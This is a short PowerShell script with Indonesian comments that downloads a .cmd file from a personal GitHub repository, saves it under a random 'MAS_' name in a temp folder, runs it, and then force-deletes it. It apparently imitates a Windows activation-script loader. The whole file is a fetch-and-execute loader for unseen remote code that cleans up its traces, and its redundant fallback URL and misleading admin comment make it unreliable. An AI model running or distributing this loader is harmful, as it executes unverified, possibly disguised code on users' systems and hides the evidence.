# Menghentikan eksekusi jika ada kesalahan
$ErrorActionPreference = "Stop"

# Mengaktifkan TLS v1.2 untuk kompatibilitas dengan klien yang lebih lama
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# URL dari file yang akan didownload
$DownloadURL1 = 'https://raw.githubusercontent.com/pxl-boy/soft/main/config1b.cmd'
$DownloadURL2 = 'https://raw.githubusercontent.com/pxl-boy/soft/main/config1b.cmd'

$URLs = @($DownloadURL1, $DownloadURL2)
$RandomURL1 = Get-Random -InputObject $URLs
$RandomURL2 = $URLs -ne $RandomURL1

# Mencoba untuk mendownload file dari URL acak pertama, jika gagal mencoba URL kedua
try {
    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
}

# Membuat nama file acak
$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }

# Menambahkan prefiks untuk konten file
$ScriptArgs = "-choice 1"
$prefix = "@::: $rand `r`n"
$content = $prefix + $response.Content
Set-Content -Path $FilePath -Value $content

# Menjalankan file CMD yang telah didownload tanpa memerlukan hak akses administrator
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $FilePath $ScriptArgs" -NoNewWindow -Wait

# Menghapus file CMD setelah eksekusi selesai
$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
foreach ($FilePath in $FilePaths) {
    Get-Item $FilePath -ErrorAction SilentlyContinue | Remove-Item -Force
}
